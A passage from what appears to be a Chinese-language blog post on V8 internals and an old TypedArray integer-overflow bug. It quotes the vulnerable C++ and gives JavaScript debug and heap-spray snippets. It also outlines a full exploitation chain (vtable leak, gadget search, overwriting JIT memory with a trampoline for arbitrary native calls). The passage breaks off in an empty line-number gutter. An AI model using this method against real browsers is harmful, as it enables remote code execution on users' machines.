<li>在源代码中，所有Object都使用此Handle<t>类型进行管理</t></li>
<li>GC有可能移动Object的位置<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-124518.png" alt=""><br>即使GC移动该Object，由于handle不移动，所以没有不一致</li>
</ul>
</li>
<li>常用Handle<ul>
<li>Handle<t><ul>
<li>Abstract class</li>
</ul>
</t></li>
<li>Local<t><ul>
<li>Temporary Handle, 保留在stack上</li>
<li><strong>使用后面将介绍的HandleScope进行生命周期管理</strong></li>
</ul>
</t></li>
<li>MaybeLocal<t><ul>
<li>它与Local<t>相同，但在使用前检查它是否为空</t></li>
</ul>
</t></li>
<li>Persistent<t><ul>
<li>一个persistent Handle,保留在heap上</li>
<li>代码编写器使用Persistent::Reset（）管理生命周期</li>
</ul>
</t></li>
</ul>
</li>
</ul>
</li>
<li>HandleScope<ul>
<li>handle总结<ul>
<li>Temporary Handle such as Local <t>, MaybeLocal<t></t></t></li>
<li>在声明HandleScope时，块中的每个handle都会自动关联</li>
</ul>
</li>
<li><strong>当HandleScope超出范围时，它会处理释放handle</strong><ul>
<li>返回函数时，结束{}时，等</li>
<li>用所有使用的handle来描述释放处理是低效的</li>
<li>使用HandleScope的析构函数，GC负责实际的释放处理</li>
</ul>
</li>
<li>参考以下的文件<ul>
<li>include/v8.h，src/handles.h</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h3><ul>
<li>在一个V8实例中创建多个执行环境的机制<ul>
<li>您可以在一个线程中同时运行彼此独立的JavaScript代码</li>
</ul>
</li>
<li>每个Context对象都有一个全局的Root-Object</li>
</ul>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-132114.png" alt=""><br>左边：每个context都有一个Root-Object，并且彼此独立（在本例中，context是嵌套的，但Root-Object正确切换）<br>右边：总之，它实现了环境的切换。 我们希望分别通过window，iframe和extended script来独立保护环境。所谓的origin也是在Context中定义的，并且从一个Context到另一个Context的访问不能被默认完成。</p>
<h3 id="Isolate"><a href="#Isolate" class="headerlink" title="Isolate"></a>Isolate</h3><ul>
<li>Instance of V8 itself<ul>
<li>context是在同一个instance中实现不同的执行环境</li>
<li>当你想运行自己的多个instance时使用Isolate<ul>
<li>为了适应多线程</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-133452.png" alt=""></p>
<h3 id="Platform"><a href="#Platform" class="headerlink" title="Platform"></a>Platform</h3><ul>
<li>It seems to define the operating environment (it seems)<ul>
<li>线程相关<ul>
<li>决定后台线程和前台线程</li>
<li>管理线程池</li>
</ul>
</li>
<li>任务队列管理</li>
<li>事件追踪</li>
</ul>
</li>
</ul>
<h2 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[src/v8/src/runtime.cc]</span><br><span class="line">RUNTIME_FUNCTION(MaybeObject*, Runtime_TypedArrayInitializeFromArrayLike)</span><br><span class="line">...</span><br><span class="line">  <span class="keyword">size_t</span> byte_length = length * element_size;<span class="comment">//integer overflow</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (byte_length &lt; length) &#123;</span><br><span class="line">    <span class="keyword">return</span> isolate-&gt;Throw(*isolate-&gt;factory()-&gt;</span><br><span class="line">      NewRangeError(<span class="string">"invalid_array_buffer_length"</span>,</span><br><span class="line">      HandleVector&lt;Object&gt;(<span class="literal">NULL</span>, <span class="number">0</span>)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!Runtime::SetupArrayBufferAllocatingData(</span><br><span class="line">        isolate, buffer, byte_length, <span class="literal">false</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> isolate-&gt;Throw(*isolate-&gt;factory()-&gt;</span><br><span class="line">          NewRangeError(<span class="string">"invalid_array_buffer_length"</span>,</span><br><span class="line">            HandleVector&lt;Object&gt;(<span class="literal">NULL</span>, <span class="number">0</span>)));</span><br><span class="line">  &#125;<span class="comment">//The overflowed byte_length is passed to Runtime::SetupArrayBufferAllocatingData</span></span><br><span class="line">  <span class="comment">// which allocates the undersized buffer and initialises a V8 JSArrayBuffer object to point to it.</span></span><br><span class="line"></span><br><span class="line">  holder-&gt;set_buffer(*buffer);</span><br><span class="line">  holder-&gt;set_byte_offset(Smi::FromInt(<span class="number">0</span>));</span><br><span class="line">  Handle&lt;Object&gt; byte_length_obj(</span><br><span class="line">      isolate-&gt;factory()-&gt;NewNumberFromSize(byte_length));</span><br><span class="line">  holder-&gt;set_byte_length(*byte_length_obj);</span><br><span class="line">  holder-&gt;set_length(*length_obj);</span><br><span class="line">  holder-&gt;set_weak_next(buffer-&gt;weak_first_view());</span><br><span class="line">  buffer-&gt;set_weak_first_view(*holder);</span><br><span class="line"></span><br><span class="line">  Handle&lt;ExternalArray&gt; elements =</span><br><span class="line">      isolate-&gt;factory()-&gt;NewExternalArray(</span><br><span class="line">          <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(length), array_type,</span><br><span class="line">          <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>*&gt;(buffer-&gt;backing_store()));</span><br><span class="line">  holder-&gt;set_elements(*elements);</span><br><span class="line">  <span class="comment">//This JSArrayBuffer is then pointed to by a JSTypedArray for the Float64 </span></span><br><span class="line">  <span class="comment">//type which uses the original length property of the arrayLike object (which is in 8 byte units,</span></span><br><span class="line">  <span class="comment">// not bytes) to create an ExternalArray that will actually be used to manipulate the </span></span><br><span class="line">  <span class="comment">//underlying ArrayBuffer memory from javascript.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ArrayBuffer* V8ArrayBuffer::toNative(v8::Handle&lt;v8::Object&gt; object)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">    v8::ArrayBuffer::Contents v8Contents = v8buffer-&gt;Externalize();</span><br><span class="line"></span><br><span class="line">    ArrayBufferContents contents(v8Contents.Data(), v8Contents.ByteLength(),</span><br><span class="line">        V8ArrayBufferDeallocationObserver::instanceTemplate());</span><br><span class="line"></span><br><span class="line">    RefPtr&lt;ArrayBuffer&gt; buffer = ArrayBuffer::create(contents);</span><br><span class="line"></span><br><span class="line">    V8DOMWrapper::associateObjectWithWrapper&lt;V8ArrayBuffer&gt;(buffer.release(), &amp;wrapperTypeInfo, object, v8::Isolate::GetCurrent(), WrapperConfiguration::Dependent);</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">bufferData1Method</span><span class="params">(<span class="keyword">const</span> v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">    V8TRYCATCH_VOID(ArrayBuffer*, data, info[<span class="number">1</span>]-&gt;IsArrayBuffer() ? V8ArrayBuffer::toNative(v8::Handle&lt;v8::ArrayBuffer&gt;::Cast(info[<span class="number">1</span>])) : <span class="number">0</span>);</span><br><span class="line">...</span><br><span class="line">    imp-&gt;bufferData(target, data, usage);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="回调"><a href="#回调" class="headerlink" title="回调"></a>回调</h2><p><code>obj.__defineGetter__(property, func)</code><br>The square bracket array syntax (eg: foo[1]) when applied to regular javascript objects is also just reading a property, even if the property is a number this will still invoke a getter if one has been defined.</p>
<h2 id="需要调试的"><a href="#需要调试的" class="headerlink" title="需要调试的"></a>需要调试的</h2><p>backing store</p>
<ul>
<li><p>Uint8<br>meta 0x13381<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-06-024853.png" alt=""></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t_arr=<span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">0x13370</span>);</span><br><span class="line">t_arr[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">t_arr[<span class="number">1</span>]=<span class="number">2</span>;</span><br><span class="line">t_arr[<span class="number">2</span>]=<span class="number">3</span>;</span><br><span class="line">t_arr[<span class="number">3</span>]=<span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">%DebugPrint(t_arr)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>Float64<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-06-024759.png" alt=""><br>meta 0x9a002<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-06-024821.png" alt=""></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t_arr=<span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="number">0x13370</span>);</span><br><span class="line">t_arr[<span class="number">0</span>]=<span class="number">1.0</span>;</span><br><span class="line">t_arr[<span class="number">1</span>]=<span class="number">2.0</span>;</span><br><span class="line">t_arr[<span class="number">2</span>]=<span class="number">3.0</span>;</span><br><span class="line">t_arr[<span class="number">3</span>]=<span class="number">4.0</span>;</span><br><span class="line"></span><br><span class="line">%DebugPrint(t_arr)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>其他需要调试的<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initialOverwrite</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arrays = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">300</span>);</span><br><span class="line">    <span class="keyword">var</span> arraysI = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createArray</span>(<span class="params">byteSize, num</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(byteSize);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; byteSize; i++) &#123;</span><br><span class="line">            a[i] = <span class="number">0x42</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        arrays[arraysI++] = a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrays.length; i++) &#123;</span><br><span class="line">    createArray(<span class="number">0x20000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>思路，调试到backstore，看一下页分布？</p>
<h2 id="log"><a href="#log" class="headerlink" title="log"></a>log</h2><ol>
<li>因为我们知道如果相乘溢出，它会溢出到数组长度以下，有没有问题？<br>曾经有一段时间我这么认为。但是，在某些情况下它会溢出，但是绕过判断。<br>例如，0x24924924(length) float64（8字节）在32位环境中受到保护。<br>然后byte_length溢出，byte_length = 0x24924924 * 8 = 0x124924928 -&gt; 0x24924928<br>但在32位环境中它不满足byte_length &lt; length,并将通过检查。</li>
</ol>
<ol>
<li><p>修改大小并free chunk(j)之后用WTF::ArrayBuffer占位<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-06-024535.png" alt=""></p>
</li>
<li><p>all the ArrayBuffer structures we’ve seen up until now (apart from the actual backing buffer) have been in the V8 GC heap whereas the memory corruption is happening in the dlmalloc heap.</p>
</li>
<li><p>Well, from here on, we prepare to execute arbitrary code (prepareForCalls).<br>We also make WTF :: DataView and read its vtbl. Then, since you know the position of .text, search for gadget (code fragment) calling dlsym from there. Follow PLT (Procedure Linkage Table) and load the thread_data<em>table</em> pointer of v8. Then you follow the structure and you will know the position of JS’s heap. There is also rwx JITed code storage. Then eval the function that generates dummy findable code, find the JIT machine code, and rewrite it to trampoline. Trampoline is a piece of code that calls a function by writing the value written in callbuf back to the register so that you can call any native function or systemcall with arbitrary argument using the function on JS! The attacker could now completely control the inside of the sandbox.</p>
</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span 